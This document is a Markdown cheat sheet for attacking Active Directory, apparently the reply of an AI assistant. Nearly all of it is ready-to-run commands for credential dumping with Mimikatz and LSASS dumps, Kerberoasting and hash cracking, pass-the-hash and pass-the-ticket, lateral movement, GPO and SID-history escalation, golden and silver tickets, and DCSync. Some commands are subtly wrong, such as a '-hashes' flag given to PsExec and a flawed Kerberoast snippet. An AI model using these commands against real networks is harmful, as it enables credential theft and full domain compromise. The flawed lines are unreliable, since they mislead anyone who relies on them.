Hereâ€™s a cheat sheet for **Active Directory Exploitation**:

### **Active Directory Exploitation Cheat Sheet**

#### **1. Enumeration**

- **Find Domain Controllers**:
  
  ```powershell
  nltest /dclist:domain_name
  ```

- **List Domain Trusts**:
  
  ```powershell
  nltest /domain_trusts
  ```

- **Query Domain and Forest Functional Levels**:
  
  ```powershell
  Get-ADForest | Select-Object ForestMode
  Get-ADDomain | Select-Object DomainMode
  ```

- **Enumerate AD Users**:
  
  ```powershell
  Get-ADUser -Filter * -Properties SamAccountName, DisplayName, Mail, MemberOf
  ```

- **Enumerate AD Groups**:
  
  ```powershell
  Get-ADGroup -Filter * -Properties Name, Description
  ```

- **Enumerate AD Computers**:
  
  ```powershell
  Get-ADComputer -Filter * -Properties Name, OperatingSystem, LastLogonDate
  ```

- **Enumerate AD Domain Admins**:
  
  ```powershell
  Get-ADGroupMember -Identity "Domain Admins"
  ```

- **Enumerate AD Service Principal Names (SPNs)**:
  
  ```powershell
  Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName
  ```

#### **2. Credential Dumping**

- **Dump Hashes Using Mimikatz**:
  
  ```powershell
  sekurlsa::logonpasswords
  ```

- **Dump Kerberos Tickets**:
  
  ```powershell
  sekurlsa::tickets
  ```

- **Extract NTLM Hashes**:
  
  ```powershell
  lsadump::lsa /patch
  ```

- **Dump Credentials from LSASS**:
  
  ```powershell
  .\Procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
  ```

  Load the dump in Mimikatz:
  
  ```powershell
  sekurlsa::minidump lsass_dump.dmp
  sekurlsa::logonpasswords
  ```

#### **3. Kerberoasting**

- **Request Service Tickets**:
  
  ```powershell
  Add-Type -AssemblyName System.IdentityModel
  $Context = New-Object System.IdentityModel.Tokens.KerberosSecurityTokenProvider $UserName, $Password, $DomainName
  $Token = $Context.GetToken($Null)
  $Ticket = $Token.GetRequest()
  ```

- **Extract and Crack Service Ticket Hashes**:
  
  ```powershell
  Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII kerberoast.txt
  ```

- **Crack Hashes with Hashcat**:
  
  ```sh
  hashcat -m 13100 kerberoast.txt wordlist.txt
  ```

#### **4. Pass-the-Hash (PtH) Attacks**

- **Using Mimikatz for PtH**:
  
  ```powershell
  sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:cmd.exe
  ```

- **Remote Execution with PsExec**:
  
  ```sh
  psexec.exe -hashes :HASH -u DOMAIN\USERNAME \\TARGET cmd.exe
  ```

#### **5. Pass-the-Ticket (PtT) Attacks**

- **Export a Ticket from Mimikatz**:
  
  ```powershell
  kerberos::list /export
  ```

- **Import a Ticket with Mimikatz**:
  
  ```powershell
  kerberos::ptt ticket.kirbi
  ```

#### **6. Lateral Movement**

- **Using WMI for Lateral Movement**:
  
  ```powershell
  Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c dir" -ComputerName TARGET_IP -Credential (Get-Credential)
  ```

- **Using PsExec**:
  
  ```sh
  psexec.exe \\TARGET_IP -u USERNAME -p PASSWORD cmd.exe
  ```

- **PowerShell Remoting**:
  
  ```powershell
  Enter-PSSession -ComputerName TARGET_IP -Credential (Get-Credential)
  ```

#### **7. Privilege Escalation**

- **Enumerate Privileged Groups**:
  
  ```powershell
  Get-ADGroupMember -Identity "Administrators"
  Get-ADGroupMember -Identity "Domain Admins"
  ```

- **Identify Kerberos Delegation**:
  
  ```powershell
  Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
  ```

- **Exploit GPO for Privilege Escalation**:
  
  ```powershell
  Invoke-GPOAddAdmin -AccountName "DOMAIN\Username" -TargetGPOName "GPOName"
  ```

- **SID History Injection**:
  
  ```powershell
  mimikatz # sid::patch
  mimikatz # sid::add /sid:S-1-5-21-... /user:USERNAME
  ```

#### **8. Golden Ticket Attack**

- **Create a Golden Ticket**:
  
  ```powershell
  kerberos::golden /user:USERNAME /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /id:500
  ```

- **Use the Golden Ticket**:
  
  ```powershell
  kerberos::ptt golden_ticket.kirbi
  ```

#### **9. Silver Ticket Attack**

- **Create a Silver Ticket**:
  
  ```powershell
  kerberos::golden /domain:DOMAIN /sid:S-1-5-21-... /target:TARGET /service:cifs /rc4:HASH /user:USERNAME /id:500
  ```

- **Use the Silver Ticket**:
  
  ```powershell
  kerberos::ptt silver_ticket.kirbi
  ```

#### **10. DCSync Attack**

- **Dump NTLM Hashes with DCSync**:
  
  ```powershell
  lsadump::dcsync /user:DOMAIN\krbtgt
  ```

- **Perform DCSync with PowerView**:
  
  ```powershell
  Invoke-DCSync -UserName "krbtgt"
  ```

